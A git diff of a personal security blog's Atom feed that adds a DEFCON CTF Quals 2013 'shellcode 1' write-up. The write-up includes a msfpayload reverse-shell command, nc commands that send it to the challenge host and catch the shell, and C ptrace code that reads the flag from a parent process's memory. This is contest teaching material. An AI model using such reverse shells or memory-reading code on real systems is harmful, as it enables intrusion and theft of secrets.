@@ -1,5 +1,74 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>rep.github.com</title><link href="http://rep.github.com/" rel="alternate"></link><link href="http://rep.github.com/feeds/all-en.atom.xml" rel="self"></link><id>http://rep.github.com/</id><updated>2013-03-23T20:00:00+01:00</updated><entry><title>UCSB iCTF 2012/2013 - Airplane</title><link href="http://rep.github.com/ictf-2012-airplane-exploit.html" rel="alternate"></link><updated>2013-03-23T20:00:00+01:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:rep.github.com,2013-03-23:ictf-2012-airplane-exploit.html</id><summary type="html">&lt;p&gt;This write-up walks through the steps we took to finally end up with a working exploit for the &lt;a class="reference external" href="http://ictf.cs.ucsb.edu/"&gt;UCSB iCTF 2012&lt;/a&gt; (2013) &amp;quot;airplane&amp;quot; service.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>rep.github.com</title><link href="/" rel="alternate"></link><link href="/feeds/all-en.atom.xml" rel="self"></link><id>/</id><updated>2013-06-17T08:00:00+02:00</updated><entry><title>DEFCON CTF Quals 2013 - shellcode 1</title><link href="/defcon-ctf-quals-2013-sc1.html" rel="alternate"></link><updated>2013-06-17T08:00:00+02:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:,2013-06-17:defcon-ctf-quals-2013-sc1.html</id><summary type="html">&lt;p&gt;It was DEFCON Quals time again - this time with a new organizer: &lt;a class="reference external" href="http://legitbs.net/"&gt;Legit Business Syndicate&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We solved quite a few challenges and collected 48 points - this sadly was not enough to bring us into the top of the scoreboard, though.&lt;/p&gt;
+&lt;p&gt;One of the first challenges I worked on was shellcode 1 aka &lt;tt class="docutils literal"&gt;incest&lt;/tt&gt;. This was a set of two 64 bit binaries that basically executed shellcode directly and read in the key file before - but with a twist. So here is the short write-up, even though it was not a very complicated challenge. We will save the more interesting write-ups for later :)&lt;/p&gt;
+&lt;div class="section" id="the-wrapper-maw"&gt;
+&lt;h2&gt;The wrapper - &lt;tt class="docutils literal"&gt;maw&lt;/tt&gt;&lt;/h2&gt;
+&lt;p&gt;The main service binary is called &lt;tt class="docutils literal"&gt;maw&lt;/tt&gt; and does the usual listen-socket wrapping as shown in the screenshot below. However it also opens the key file and for handling the accepted client actually executes another binary called &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; and tells it about the client socket fd and the open fd to the key file.&lt;/p&gt;
+&lt;img alt="pictures/maw.png" src="pictures/maw.png" /&gt;
+&lt;/div&gt;
+&lt;div class="section" id="the-handler-sis"&gt;
+&lt;h2&gt;The handler - &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt;&lt;/h2&gt;
+&lt;p&gt;The &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; binary is small and simple - it basically takes the fds from its arguments, then forks and the parent will read in the keyfile content and wait for a bit (15 seconds) and the child will read from the socket and jump into the received data - thus basically executing our sent shellcode.&lt;/p&gt;
+&lt;a class="reference external image-reference" href="pictures/sis.png"&gt;&lt;img alt="sis disassembly" src="pictures/sis.png" style="width: 200px; height: 100px;" /&gt;&lt;/a&gt;
+&lt;p&gt;Thus the twist is that even with our shellcode running we can not see the key in memory, as it is only available in the other process. We thought that spawning a shell and attaching to that other process with a debugger would get the job done.&lt;/p&gt;
+&lt;p&gt;Alright, generate shellcode, send it over.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfpayload linux/x64/shell_reverse_tcp LHOST=?.?.?.? LPORT=4445 R &amp;gt; shellcode.bin
+
+nc incest.shallweplayaga.me 65535 &amp;lt; shellcode.bin
+
+$ nc -vnlp 4445
+listening on [any] 4445 ...
+connect to [?.?.?.?] from (UNKNOWN) [54.224.177.78] 56776
+id
+uid=1001(maw) gid=1001(maw) groups=1001(maw)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Looking at the code of how the parent &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; reads in the keyfile we can see that it allocates a buffer and writes its address to rbp-0x18 - so that should still be valid even during the sched_yield loop.
+Sadly at this point we had some problems attaching with gdb and thus did retrieve the key with a small ptrace binary of our own. I compiled the following code and copied it over to the service machine's tmp folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+    &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;retval&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;user_regs_struct&lt;/span&gt; &lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+
+    &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_ATTACH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_GETREGS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;ptr_keystring&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_PEEKTEXT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;regs pid %d rbp %p val@rbp-0x18 %lx&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;=&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;retval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_PEEKTEXT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;read %lx -&amp;gt; %lx&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;swap_int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;retval&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_DETACH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This basically attaches to the pid, gets the registers in order to know rbp, and then retrieves the address of the keyfile content buffer from rbp-0x18. Several PEEKs later we should have the key...&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;connect to [?.?.?.?] from (UNKNOWN) [54.224.177.78] 56783
+/tmp/.oldeurope/pt $(cat /proc/$$/status | grep PPid | awk &amp;#39;{print $2}&amp;#39;)
+regs pid 2196 rbp 0x7fff97ef83b0 val@rbp-0x18 15ed010
+read 15ed010 -&amp;gt; 546865206b657920
+read 15ed018 -&amp;gt; 69733a206b333370
+read 15ed020 -&amp;gt; 20697420696e2074
+read 15ed028 -&amp;gt; 68652066616d696c
+read 15ed030 -&amp;gt; 790a000000000000
+read 15ed038 -&amp;gt; d10f020000000000
+read 15ed040 -&amp;gt; 0
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now just print those hexdigits as ASCII:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;546865206b65792069733a206b33337020697420696e207468652066616d696c790a000000000000&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s"&gt;&amp;#39;The key is: k33p it in the family&lt;/span&gt;&lt;span class="se"&gt;\n\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This was definitely a relatively easy challenge - not really about crafting shellcode, but nevertheless the twist of retrieving the key from the parent process was quite nice!&lt;/p&gt;
+&lt;p&gt;More write-ups to come soon...&lt;/p&gt;
+&lt;blockquote&gt;
+-- mark&lt;/blockquote&gt;
+&lt;/div&gt;
+</summary><category term="ctf"></category><category term="exploit"></category><category term="defcon"></category><category term="quals"></category></entry><entry><title>UCSB iCTF 2012/2013 - Airplane</title><link href="/ictf-2012-airplane-exploit.html" rel="alternate"></link><updated>2013-03-23T20:00:00+01:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:,2013-03-23:ictf-2012-airplane-exploit.html</id><summary type="html">&lt;p&gt;This write-up walks through the steps we took to finally end up with a working exploit for the &lt;a class="reference external" href="http://ictf.cs.ucsb.edu/"&gt;UCSB iCTF 2012&lt;/a&gt; (2013) &amp;quot;airplane&amp;quot; service.&lt;/p&gt;
 &lt;p&gt;The CTF was postponed from normally being run in early December to March 22nd. I participated again with the &lt;a class="reference external" href="http://ctf.itsec.rwth-aachen.de/"&gt;0ldEur0pe&lt;/a&gt; team - with base of operations in the UMIC Research Center in Aachen.&lt;/p&gt;
 &lt;div class="section" id="overview-the-airplane-service"&gt;
 &lt;h2&gt;Overview - the &lt;tt class="docutils literal"&gt;airplane&lt;/tt&gt; service&lt;/h2&gt;
@@ -216,8 +285,8 @@ FLAG=FLGrK8C5stGDHv74
 &lt;blockquote&gt;
 -- mark&lt;/blockquote&gt;
 &lt;/div&gt;
-</summary><category term="ctf"></category><category term="exploit"></category><category term="ictf"></category><category term="ucsb"></category></entry><entry><title>__init__()</title><link href="http://rep.github.com/site-init.html" rel="alternate"></link><updated>2013-03-23T20:00:00+01:00</updated><author><name>Mark Schloesser</name></author><id>tag:rep.github.com,2013-03-23:site-init.html</id><summary type="html">&lt;p&gt;I had to quickly setup a site for posting the UCSB exploit write-up to. This is it powered by Pelican - a static page generator in Python.&lt;/p&gt;
-</summary><category term="blog"></category><category term="site"></category></entry><entry><title>About this site</title><link href="http://rep.github.com/about.html" rel="alternate"></link><updated>2013-03-23T00:00:00+01:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:rep.github.com,2013-03-23:about.html</id><summary type="html">&lt;p&gt;This site is maintainted by Mark &amp;quot;rep&amp;quot; Schloesser. You can find links to my Github / Twitter in the bottom.&lt;/p&gt;
+</summary><category term="ctf"></category><category term="exploit"></category><category term="ictf"></category><category term="ucsb"></category></entry><entry><title>__init__()</title><link href="/site-init.html" rel="alternate"></link><updated>2013-03-23T20:00:00+01:00</updated><author><name>Mark Schloesser</name></author><id>tag:,2013-03-23:site-init.html</id><summary type="html">&lt;p&gt;I had to quickly setup a site for posting the UCSB exploit write-up to. This is it powered by Pelican - a static page generator in Python.&lt;/p&gt;
+</summary><category term="blog"></category><category term="site"></category></entry><entry><title>About this site</title><link href="/about.html" rel="alternate"></link><updated>2013-03-23T00:00:00+01:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:,2013-03-23:about.html</id><summary type="html">&lt;p&gt;This site is maintainted by Mark &amp;quot;rep&amp;quot; Schloesser. You can find links to my Github / Twitter in the bottom.&lt;/p&gt;
 &lt;p&gt;You can also drop me an E-Mail according to the following information.&lt;/p&gt;
 &lt;div class="section" id="key-id-0x0930f6a9"&gt;
 &lt;h2&gt;Key ID 0x0930F6A9&lt;/h2&gt;
